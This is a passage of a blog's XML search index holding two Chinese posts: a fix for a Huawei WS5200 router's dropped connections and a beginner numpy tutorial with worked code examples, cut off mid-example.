<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>华为路由器WS5200四核版经常断网问题解决方案</title>
      <link href="/2021/04-25-problem-solve.html"/>
      <url>/2021/04-25-problem-solve.html</url>
      <content type="html"><![CDATA[<p>总的来说这款路由器还不错，但是一直遇到突然断网的情况。之前没太在意，但是今年4月初我研究生考试网上复试的时候，最后几分钟竟然断网了，还好当时还算冷静，1分钟不到又用热点立马连上了（可见预案的重要性，也要保证流量充足），当时吓得差点当场去世…，虽然最后成功上岸了，但是还是被吓的不轻。</p><p>后来我仔细回想了下，因为我们是双机位，主机位用的电脑，是联想拯救者Y7000，断网的就是这个，辅机位用的是刚买的荣耀轻奢版v30（支持5G的），这部手机使用无线网络的时候一直都是好好的，没出现过断网情况。我平时用的是华为p20（4G不支持5G），也经常出现断网情况。</p><p>考虑是不是信号切换的问题，然后就试了下。<strong>从华为手机的“智慧生活”里进入路由器的设置，进入Wi-Fi管理-&gt;Wi-Fi设置，将5G优选关闭，底下的5G Wi-Fi也关闭，最后只使用2.4G Wi-Fi。</strong>用了一段时间发现没有再出现断网问题，现在打王者的时候网速也非常稳定。当然，如果手机支持5G的话是可以打开5G优选的。我用支持5G的手机没有出现断网问题，不支持5G可以直接关闭。</p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>numpy、pandas、matplotlib总结</title>
      <link href="/2021/04-21-python-lib.html"/>
      <url>/2021/04-21-python-lib.html</url>
      <content type="html"><![CDATA[<h1 id="numpy-amp-pandas"><a href="#numpy-amp-pandas" class="headerlink" title="numpy &amp; pandas"></a>numpy &amp; pandas</h1><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>运算速度快：numpy 和 pandas 都是采用 C 语言编写, pandas 又是基于 numpy, 是 numpy 的升级版本。</li><li>消耗资源少：采用的是矩阵运算，会比 python 自带的字典或者列表快好多</li></ul><h2 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h2><h3 id="官方参考文档（2021-4-18引用）"><a href="#官方参考文档（2021-4-18引用）" class="headerlink" title="官方参考文档（2021-4-18引用）"></a>官方参考文档（2021-4-18引用）</h3><p><a href="https://numpy.org/doc/stable/reference/" target="_blank" rel="noopener">https://numpy.org/doc/stable/reference/</a></p><h3 id="numpy-的属性"><a href="#numpy-的属性" class="headerlink" title="numpy 的属性"></a>numpy 的属性</h3><ul><li><code>ndim</code>：维度</li><li><code>shape</code>：行数和列数</li><li><code>size</code>：元素个数</li></ul><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">array = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">print(type(array),<span class="string">'\n'</span>,array)</span><br><span class="line"><span class="comment">#&lt;class 'list'&gt;</span></span><br><span class="line"><span class="comment">#[[1, 2, 3], [2, 3, 4]]</span></span><br><span class="line"><span class="comment"># 列表转化为矩阵</span></span><br><span class="line">array = np.array(array)</span><br><span class="line">print(type(array),<span class="string">'\n'</span>,array)</span><br><span class="line"><span class="comment">#&lt;class 'numpy.ndarray'&gt;</span></span><br><span class="line"><span class="comment"># [[1 2 3]</span></span><br><span class="line"><span class="comment"># [2 3 4]]</span></span><br><span class="line">print(<span class="string">'number of dim:'</span>,array.ndim)  <span class="comment"># 维度</span></span><br><span class="line"><span class="comment"># number of dim: 2</span></span><br><span class="line">print(<span class="string">'shape :'</span>,array.shape)    <span class="comment"># 行数和列数</span></span><br><span class="line"><span class="comment"># shape : (2, 3)</span></span><br><span class="line">print(<span class="string">'size:'</span>,array.size)   <span class="comment"># 元素个数</span></span><br><span class="line"><span class="comment"># size: 6</span></span><br></pre></td></tr></table></figure><h3 id="创建array的形式"><a href="#创建array的形式" class="headerlink" title="创建array的形式"></a>创建array的形式</h3><p>形式包括：</p><ul><li><code>array</code>：创建数组</li><li><code>dtype</code>：指定数据类型</li><li><code>zeros</code>：创建数据全为0</li><li><code>ones</code>：创建数据全为1</li><li><code>empty</code>：创建数据接近0</li><li><code>arrange</code>：按指定范围创建数据</li><li><code>linspace</code>：创建线段</li></ul><p>创建数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([<span class="number">2</span>, <span class="number">23</span>, <span class="number">4</span>])</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># [ 2 23  4]</span></span><br></pre></td></tr></table></figure><p>指定数据dtype</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([<span class="number">2</span>, <span class="number">23</span>, <span class="number">4</span>], dtype=np.int)</span><br><span class="line">print(a.dtype)</span><br><span class="line"><span class="comment"># int32</span></span><br><span class="line"><span class="comment"># dtype类型包括｛int64：int64，int32:int32，float：float64，float32:float32｝</span></span><br><span class="line"><span class="comment"># int我用的pycharm2020 3.3默认32</span></span><br></pre></td></tr></table></figure><p>创建特定数据(全0、全1、更改矩阵形状)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手动创建特定数据</span></span><br><span class="line">a = np.array([[<span class="number">2</span>, <span class="number">23</span>, <span class="number">4</span>], [<span class="number">2</span>, <span class="number">32</span>, <span class="number">4</span>]])  <span class="comment"># 2d 矩阵 2行3列</span></span><br><span class="line">print(a)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[ 2 23  4]</span></span><br><span class="line"><span class="string"> [ 2 32  4]]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建全零数组</span></span><br><span class="line">a = np.zeros((<span class="number">3</span>, <span class="number">4</span>))  <span class="comment"># 数据全为0，3行4列</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建全一数组, 同时也能指定这些特定数据的 dtype</span></span><br><span class="line">a = np.ones((<span class="number">3</span>, <span class="number">4</span>), dtype=np.int)  <span class="comment"># 数据全为1，3行4列</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建全空数组, 其实每个值都是接近于零的数</span></span><br><span class="line">a = np.empty((<span class="number">3</span>, <span class="number">4</span>))  <span class="comment"># 数据为empty，3行4列</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 arange 创建连续数组</span></span><br><span class="line">a = np.arange(<span class="number">10</span>, <span class="number">20</span>, <span class="number">2</span>)  <span class="comment"># 10-19 的数据，2步长，步长默认为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 reshape 改变数据的形状</span></span><br><span class="line">a = np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>, <span class="number">4</span>))  <span class="comment"># 3行4列，0到11，左闭右开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 linspace 创建线段型数据</span></span><br><span class="line">a = np.linspace(<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>)  <span class="comment"># 开始端1，结束端10，且分割成20个数据，生成线段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样也能进行 reshape 工作</span></span><br><span class="line">a = np.linspace(<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>).reshape((<span class="number">5</span>, <span class="number">4</span>))  <span class="comment"># 更改shape</span></span><br></pre></td></tr></table></figure><h3 id="矩阵基本运算"><a href="#矩阵基本运算" class="headerlink" title="矩阵基本运算"></a>矩阵基本运算</h3><h4 id="矩阵的加减乘法"><a href="#矩阵的加减乘法" class="headerlink" title="矩阵的加减乘法"></a>矩阵的加减乘法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.array([<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>])   <span class="comment"># array([10, 20, 30, 40])</span></span><br><span class="line">b=np.arange(<span class="number">4</span>)             <span class="comment"># array([0, 1, 2, 3])</span></span><br><span class="line"><span class="comment"># 两个矩阵之间的加减乘（矩阵对应元素的相加减和相乘）</span></span><br><span class="line">print(a-b)   <span class="comment">#[10 19 28 37]</span></span><br><span class="line">print(a+b)   <span class="comment">#[10 21 32 43]</span></span><br><span class="line">print(a*b)   <span class="comment">#[  0  20  60 120]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 各个元素的乘方</span></span><br><span class="line">print(b**<span class="number">2</span>)  <span class="comment">#[0 1 4 9]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数学函数工具</span></span><br><span class="line"><span class="comment">#sin函数等，用法相同</span></span><br><span class="line"><span class="number">10</span>*np.sin(a)</span><br><span class="line"><span class="comment"># array([-5.44021111,  9.12945251, -9.88031624,  7.4511316 ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑判断</span></span><br><span class="line">print(b&lt;<span class="number">3</span>)  <span class="comment"># [ True  True  True False]</span></span><br></pre></td></tr></table></figure><h4 id="矩阵相乘和矩阵点乘（对应元素乘法）"><a href="#矩阵相乘和矩阵点乘（对应元素乘法）" class="headerlink" title="矩阵相乘和矩阵点乘（对应元素乘法）"></a>矩阵相乘和矩阵点乘（对应元素乘法）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.array([[<span class="number">10</span>,<span class="number">20</span>],[<span class="number">30</span>,<span class="number">40</span>]])   </span><br><span class="line">b=np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">print(np.dot(a,b))  <span class="comment">#标准矩阵乘法，方式1</span></span><br><span class="line">print(a.dot(b))     <span class="comment">#标准矩阵乘法，方式2</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[ 40  70]</span></span><br><span class="line"><span class="string"> [ 80 150]]</span></span><br><span class="line"><span class="string"> '''</span></span><br><span class="line">print(a*b)   <span class="comment">#矩阵点乘（对应元素相乘）</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[  0  20]</span></span><br><span class="line"><span class="string"> [ 60 120]]</span></span><br><span class="line"><span class="string"> '''</span></span><br></pre></td></tr></table></figure><h4 id="对矩阵中所有元素进行求和，寻找最小值，寻找最大值"><a href="#对矩阵中所有元素进行求和，寻找最小值，寻找最大值" class="headerlink" title="对矩阵中所有元素进行求和，寻找最小值，寻找最大值"></a>对矩阵中所有元素进行求和，寻找最小值，寻找最大值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.array([[<span class="number">10</span>,<span class="number">20</span>],[<span class="number">30</span>,<span class="number">40</span>]])</span><br><span class="line">b=np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">print(np.sum(a))  <span class="comment">#100</span></span><br><span class="line">print(np.min(a))  <span class="comment">#10</span></span><br><span class="line">print(np.max(a))  <span class="comment">#40</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">需要对行或者列进行查找运算，就需要在上述代码中为 axis 进行赋值。 </span></span><br><span class="line"><span class="string">当axis的值为0的时候，将会以列作为查找单元， 当axis的值为1的时候，将会以行作为查找单元。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">print(<span class="string">"sum ="</span>,np.sum(a,axis=<span class="number">1</span>))</span><br><span class="line"><span class="comment"># sum = [30 70]</span></span><br><span class="line">print(<span class="string">"min ="</span>,np.min(a,axis=<span class="number">0</span>))</span><br><span class="line"><span class="comment"># min = [10 20]</span></span><br><span class="line">print(<span class="string">"max ="</span>,np.max(a,axis=<span class="number">1</span>))</span><br><span class="line"><span class="comment"># max = [20 40]</span></span><br></pre></td></tr></table></figure><h4 id="查找矩阵对应元素的索引"><a href="#查找矩阵对应元素的索引" class="headerlink" title="查找矩阵对应元素的索引"></a>查找矩阵对应元素的索引</h4><p> <code>argmin()</code> 和 <code>argmax()</code> 两个函数分别对应着求矩阵中最小元素和最大元素的索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.arange(<span class="number">2</span>, <span class="number">14</span>).reshape((<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># array([[ 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">#        [ 6, 7, 8, 9]</span></span><br><span class="line"><span class="comment">#        [10,11,12,13]])</span></span><br><span class="line"></span><br><span class="line">print(np.argmin(A))  <span class="comment"># 0</span></span><br><span class="line">print(np.argmax(A))  <span class="comment"># 11</span></span><br></pre></td></tr></table></figure><h4 id="求矩阵的平均值和中位数"><a href="#求矩阵的平均值和中位数" class="headerlink" title="求矩阵的平均值和中位数"></a>求矩阵的平均值和中位数</h4><p>mean和average都是计算均值的函数，在不指定权重的时候average和mean是一样的。指定权重后，average可以计算一维的加权平均值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 平均值</span></span><br><span class="line">print(np.mean(A))        <span class="comment"># 7.5，mean的形式1</span></span><br><span class="line">print(A.mean())          <span class="comment"># 7.5 mean的形式2</span></span><br><span class="line">print(np.average(A))     <span class="comment"># 7.5</span></span><br><span class="line"><span class="comment"># 中位数</span></span><br><span class="line">print(A.median())       <span class="comment"># 7.5</span></span><br></pre></td></tr></table></figure><h4 id="矩阵的累加和累减用法-cumsum和diff"><a href="#矩阵的累加和累减用法-cumsum和diff" class="headerlink" title="矩阵的累加和累减用法(cumsum和diff)"></a>矩阵的累加和累减用法(cumsum和diff)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成的每一项矩阵元素均是从原矩阵首项累加到对应项的元素之和。</span></span><br><span class="line"><span class="comment"># 比如元素9，在cumsum()生成的矩阵中序号为3，即原矩阵中2，3，4三个元素的和。</span></span><br><span class="line">print(np.cumsum(A))  <span class="comment"># [2 5 9 14 20 27 35 44 54 65 77 90]</span></span><br><span class="line"><span class="comment"># diff函数计算的便是每一行中后一项与前一项之差。故一个3行4列矩阵通过函数计算得到的矩阵便是3行3列的矩阵。</span></span><br><span class="line">print(np.diff(A))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># [[1 1 1]</span></span><br><span class="line"><span class="string">#  [1 1 1]</span></span><br><span class="line"><span class="string">#  [1 1 1]]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="将非零元素的行和列分开-nonzero"><a href="#将非零元素的行和列分开-nonzero" class="headerlink" title="将非零元素的行和列分开(nonzero)"></a>将非零元素的行和列分开(nonzero)</h4><p>将所有非零元素的行与列坐标分割开，重构成两个分别关于行和列的矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将非零元素的行列值分开</span></span><br><span class="line">print(np.nonzero(A))</span><br><span class="line"><span class="comment"># (array([0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2], dtype=int64), array([0, 1, 2, 3, 0, 1, 2, 3, 0, 1, 2, 3], dtype=int64))</span></span><br></pre></td></tr></table></figure><h4 id="行排序（sort）"><a href="#行排序（sort）" class="headerlink" title="行排序（sort）"></a>行排序（sort）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.arange(<span class="number">14</span>, <span class="number">2</span>,<span class="number">-1</span>).reshape((<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line"><span class="comment"># 对每行进行排序</span></span><br><span class="line">print(np.sort(A))</span><br></pre></td></tr></table></figure><h4 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h4><p>矩阵的转置有两种表示方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.arange(<span class="number">14</span>, <span class="number">2</span>,<span class="number">-1</span>).reshape((<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line">print(np.transpose(A))</span><br><span class="line">print(A.T)</span><br></pre></td></tr></table></figure><h4 id="元素在最大最小值外的替换（clip）"><a href="#元素在最大最小值外的替换（clip）" class="headerlink" title="元素在最大最小值外的替换（clip）"></a>元素在最大最小值外的替换（clip）</h4><p>Array指的是将要被执行用的矩阵，而后面的最小值最大值则用于让函数判断矩阵中元素是否有比最小值小的或者比最大值大的元素，<br>并将这些指定的元素转换为最小值或者最大值。比最小的小就是最小值，比最大值大替换为最大值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(np.clip(A,<span class="number">5</span>,<span class="number">9</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[9 9 9 9]</span></span><br><span class="line"><span class="string"> [9 9 8 7]</span></span><br><span class="line"><span class="string"> [6 5 5 5]]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="Numpy-索引和迭代输出"><a href="#Numpy-索引和迭代输出" class="headerlink" title="Numpy 索引和迭代输出"></a>Numpy 索引和迭代输出</h3><p>矩阵访问对应元素与其余编程语言基本一致。如print(A[1, 1])  ，访问二维数组第二行第二列的元素。</p><p>切片输出（逐行和逐列打印）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 逐行进行打印操作</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> A:</span><br><span class="line">    print(row)</span><br><span class="line"><span class="comment"># 逐列打印（将原矩阵转置输出）</span></span><br><span class="line"><span class="keyword">for</span> column <span class="keyword">in</span> A.T:</span><br><span class="line">    print(column)</span><br></pre></td></tr></table></figure><p>迭代输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.arange(<span class="number">3</span>, <span class="number">15</span>).reshape((<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">print(A.flatten())</span><br><span class="line"><span class="comment"># array([3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> A.flat:</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3,4,...14</span></span><br></pre></td></tr></table></figure><p>脚本中的<code>flatten</code>是一个展开性质的函数，将多维的矩阵进行展开成1行的数列。而<code>flat</code>是一个迭代器，本身是一个<code>object</code>属性。</p><h3 id="矩阵合并"><a href="#矩阵合并" class="headerlink" title="矩阵合并"></a>矩阵合并</h3><h4 id="垂直合并-vstack"><a href="#垂直合并-vstack" class="headerlink" title="垂直合并(vstack)"></a>垂直合并(vstack)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line">B = np.array([<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">print(np.vstack((A, B)))  <span class="comment"># vertical stack</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[[1,1,1]</span></span><br><span class="line"><span class="string"> [2,2,2]]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h4 id="水平合并（hstack）"><a href="#水平合并（hstack）" class="headerlink" title="水平合并（hstack）"></a>水平合并（hstack）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D = np.hstack((A,B))       <span class="comment"># horizontal stack</span></span><br><span class="line"></span><br><span class="line">print(D)</span><br><span class="line"><span class="comment"># [1,1,1,2,2,2]</span></span><br><span class="line"></span><br><span class="line">print(A.shape,D.shape)</span><br><span class="line"><span class="comment"># (3,) (6,)</span></span><br></pre></td></tr></table></figure><h4 id="增加维度（newaxis）"><a href="#增加维度（newaxis）" class="headerlink" title="增加维度（newaxis）"></a>增加维度（newaxis）</h4><p>如果面对如同前文所述的<code>A</code>序列， 转置操作便很有可能无法对其进行转置（因为<code>A</code>并不是矩阵的属性），此时就需要我们借助其他的函数操作进行转置。newaxis可以给原数组增加一个维度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># x[newaxis, :]等同于和：x[newaxis]x[None]</span></span><br><span class="line">print(A[np.newaxis,:])</span><br><span class="line"><span class="comment"># [[1 1 1]]</span></span><br><span class="line">print(A[:,np.newaxis])</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[1]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [1]]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>矩阵转置问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># 转置例子</span></span><br><span class="line">print(np.transpose(A).shape)</span><br><span class="line"><span class="comment"># (3,)</span></span><br><span class="line">print(np.transpose(A[np.newaxis,:]))</span><br><span class="line">print(np.transpose(A[np.newaxis,:]).shape)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[1]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [1]]</span></span><br><span class="line"><span class="string">(3, 1)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="合并多个矩阵或序列-concatenate"><a href="#合并多个矩阵或序列-concatenate" class="headerlink" title="合并多个矩阵或序列(concatenate)"></a>合并多个矩阵或序列(concatenate)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.array([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])[:,np.newaxis]</span><br><span class="line">B = np.array([<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>])[:,np.newaxis]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[1]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [1]]</span></span><br><span class="line"><span class="string">[[2]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [2]]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 按行合并</span></span><br><span class="line">C = np.concatenate((A,B,B,A),axis=<span class="number">0</span>)</span><br><span class="line">print(C)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[[1]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [2]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [1]</span></span><br><span class="line"><span class="string"> [1]]</span></span><br><span class="line"><span 